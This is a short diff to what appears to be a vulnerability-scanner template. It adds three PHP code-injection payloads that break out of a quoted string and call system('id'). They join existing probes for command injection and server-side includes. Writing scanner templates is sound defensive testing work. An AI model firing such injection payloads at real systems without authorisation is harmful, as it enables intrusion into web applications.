@@ -78,6 +78,9 @@ requests:
         - '$;/usr/bin/id'
         - '<!--#exec cmd="/usr/bin/id;-->'
         - '<?php system("id");?>'
+        - ''".system('id'); $dummy="'
+        - ''".system('id');#'
+        - ''".system('id');//'
 
     stop-at-first-match: true
     matchers:
